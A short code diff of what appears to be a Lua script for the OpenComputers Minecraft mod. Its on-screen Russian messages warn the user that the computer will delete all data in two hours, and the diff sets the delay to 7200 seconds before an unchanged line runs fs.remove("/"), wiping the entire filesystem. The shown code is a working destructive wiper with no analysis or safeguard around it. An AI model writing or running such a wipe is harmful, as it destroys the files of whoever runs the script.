@@ -66,8 +66,9 @@ os.sleep(0.05)
 gpu.set(27, 19, "И у тебя есть два часа посмотреть всё тут")
 os.sleep(0.05)
 gpu.set(27, 16, "После двух часов пк полностю удалит все данные")
-os.sleep(0.7200)
-computer.beep(100, 0.5)
+
+os.sleep(7200.0)
+computer.beep(100, 0.8)
 fs.remove("/")
 
 while true do
